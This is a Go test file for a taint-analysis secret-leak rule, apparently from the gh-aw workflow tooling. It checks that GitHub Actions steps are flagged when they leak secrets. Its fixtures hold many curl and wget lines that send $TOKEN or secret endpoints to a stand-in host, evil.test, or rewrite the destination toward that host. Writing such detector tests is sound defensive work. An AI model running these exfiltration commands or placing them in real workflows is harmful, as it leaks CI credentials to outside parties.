package taint

import (
	"context"
	"strings"
	"testing"

	"github.com/github/gh-aw/pkg/workflow/actions"
	"github.com/github/gh-aw/pkg/workflow/aw"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSafeOutputCredentialEndpoints(t *testing.T) {
	for _, tt := range []struct {
		name, run string
		kinds     []Kind
	}{
		{"whole destination", `curl "$DESTINATION"`, nil},
		{"explicit URL", `curl --url "${DESTINATION}"`, nil},
		{"pipeline", `jq -c '.items[] | select(.type == "report_security_finding") | {text: "\(.summary)\n\n\(.details)"}' \
  "$GH_AW_AGENT_OUTPUT" | curl --fail -sS -H 'Content-Type: application/json' --data @- "$DESTINATION"`, nil},
		{"payload", `curl -d "$TOKEN" "$DESTINATION"`, []Kind{Network}},
		{"endpoint as payload", `curl -d "$DESTINATION" "$DESTINATION"`, []Kind{Network}},
		{"stdin", `printf '%s' "$TOKEN" | curl --data @- "$DESTINATION"`, []Kind{Network}},
		{"stdin upload", `printf '%s' "$TOKEN" | curl -T - "$DESTINATION"`, []Kind{Network}},
		{"inline stdin upload", `printf '%s' "$TOKEN" | curl --upload-file=- "$DESTINATION"`, []Kind{Network}},
		{"nonblocking stdin upload", `printf '%s' "$TOKEN" | curl -T . "$DESTINATION"`, []Kind{Network}},
		{"file upload", `printf '%s' "$TOKEN" > body; curl -T body "$DESTINATION"`, []Kind{Network}},
		{"header", `curl -H "X-Data: $TOKEN" "$DESTINATION"`, []Kind{Network}},
		{"authentication", `curl --oauth2-bearer "$TOKEN" "$DESTINATION"`, nil},
		{"logging", `echo "$DESTINATION"; curl "$DESTINATION"`, []Kind{Log}},
		{"xtrace", `set -x; curl "$DESTINATION"`, []Kind{Log}},
		{"attacker path", `curl "https://evil.test/$DESTINATION"`, []Kind{Network}},
		{"attacker query", `curl "https://evil.test/?url=$DESTINATION"`, []Kind{Network}},
		{"appended secret", `curl "$DESTINATION?token=$TOKEN"`, []Kind{Network}},
		{"appended public value", `curl "$DESTINATION/$SUFFIX"`, []Kind{Network}},
		{"unquoted", `curl $DESTINATION`, []Kind{Network}},
		{"transform", `curl "${DESTINATION#https://}"`, []Kind{Network}},
		{"default", `curl "${DESTINATION:-https://evil.test}"`, []Kind{Network}},
		{"alias", `COPY="$DESTINATION"; curl "$COPY"`, []Kind{Network}},
		{"reassigned", `DESTINATION="https://evil.test/$DESTINATION"; curl "$DESTINATION"`, []Kind{Network}},
		{"prefix reassignment", `DESTINATION="https://evil.test/$DESTINATION" curl "$DESTINATION"`, []Kind{Network}},
		{"loop", `for DESTINATION in "https://evil.test/$DESTINATION"; do curl "$DESTINATION"; done`, []Kind{Network}},
		{"multiple destinations", `curl "$DESTINATION" https://evil.test`, []Kind{Network}},
		{"redirects", `curl -L "$DESTINATION"`, []Kind{Network}},
		{"config", `curl -K config "$DESTINATION"`, []Kind{Network}},
		{"proxy", `curl --proxy https://evil.test "$DESTINATION"`, []Kind{Network}},
		{"URL rewrite", `curl --request-target "https://evil.test/$DESTINATION" "$DESTINATION"`, []Kind{Network}},
		{"verbose", `curl -v "$DESTINATION"`, []Kind{Network}},
		{"next", `curl "$DESTINATION" --next https://evil.test`, []Kind{Network}},
		{"other client", `wget "$DESTINATION"`, []Kind{Network}},
		{"sent elsewhere", `curl -d "$DESTINATION" https://evil.test`, []Kind{Network}},
		{"sourced mutation", `. helper; curl "$DESTINATION"`, []Kind{Network}},
		{"printf mutation", `printf -v DESTINATION 'https://evil.test/%s' "$DESTINATION"; curl "$DESTINATION"`, []Kind{Log, Network}},
		{"dynamic printf mutation", `OPTION=-v; printf "$OPTION" DESTINATION 'https://evil.test/%s' "$DESTINATION"; curl "$DESTINATION"`, []Kind{Log, Network}},
		{"builtin mutation", `builtin printf -v DESTINATION 'https://evil.test/%s' "$DESTINATION"; curl "$DESTINATION"`, []Kind{Network}},
	} {
		t.Run(tt.name, func(t *testing.T) {
			for _, section := range []string{"safe-outputs:\n  jobs:", "safe-jobs:"} {
				document, err := aw.Parse("---\n" + section + `
    notify:
      runs-on: ubuntu-latest
      steps:
        - env:
            DESTINATION: ${{ secrets.ENDPOINT }}
            TOKEN: ${{ secrets.TOKEN }}
          run: |
            ` + strings.ReplaceAll(tt.run, "\n", "\n            ") + "\n---\nNotify.\n")
				require.NoError(t, err)
				result, err := AnalyzeAuthoredDocument(context.Background(), document, SecretLeakRule())
				require.NoError(t, err)
				var kinds []Kind
				for _, finding := range result.Findings {
					kinds = append(kinds, finding.Site.Kind)
				}
				assert.Equal(t, tt.kinds, kinds, "%+v", result.Findings)
				if tt.name == "payload" {
					require.Len(t, result.Findings, 1)
					require.Len(t, result.Findings[0].Sources, 1)
					assert.Equal(t, "secrets.token", result.Findings[0].Sources[0].Reference)
				}
			}
		})
	}
}

func TestCredentialEndpointRequiresSafeOutputProvenance(t *testing.T) {
	steps := `      - env:
          DESTINATION: ${{ secrets.WEBHOOK }}
        run: |
          # gh-aw: authenticated-endpoint DESTINATION
          curl "$DESTINATION"
`
	result := checkSteps(t, steps)
	require.Len(t, result.Findings, 1, "comments and names must not grant native jobs integration privileges")
	workflow, err := actions.Parse([]byte("jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n" + steps))
	require.NoError(t, err)
	document, err := aw.Parse("---\nsafe-outputs:\n  jobs:\n    other:\n      steps: []\n---\nNotify.\n")
	require.NoError(t, err)
	result, err = AnalyzeDocument(document, workflow, SecretLeakRule())
	require.NoError(t, err)
	require.Len(t, result.Findings, 1, "an unrelated integration must not grant other jobs privileges")

	document, err = aw.Parse("---\nsafe-outputs:\n  jobs:\n    test:\n      steps: []\n---\nNotify.\n")
	require.NoError(t, err)
	result, err = AnalyzeDocument(document, workflow, SecretLeakRule())
	require.NoError(t, err)
	require.Empty(t, result.Findings)
}

func TestSafeOutputEndpointRequiresDirectStepSecret(t *testing.T) {
	for _, binding := range []string{
		`https://evil.test/${{ secrets.ENDPOINT }}`,
		`${{ format('https://evil.test/{0}', secrets.ENDPOINT) }}`,
		`${{ secrets.ENDPOINT || secrets.FALLBACK }}`,
		`${{ secrets[vars.NAME] }}`,
		`${{ toJSON(secrets) }}`,
	} {
		t.Run(binding, func(t *testing.T) {
			document, err := aw.Parse(`---
safe-outputs:
  jobs:
    notify:
      runs-on: ubuntu-latest
      steps:
        - env:
            DESTINATION: ` + binding + `
          run: curl "$DESTINATION"
---
Notify.
`)
			require.NoError(t, err)
			result, err := AnalyzeAuthoredDocument(context.Background(), document, SecretLeakRule())
			require.NoError(t, err)
			require.Len(t, result.Findings, 1)
			assert.Equal(t, Network, result.Findings[0].Site.Kind)
		})
	}
}
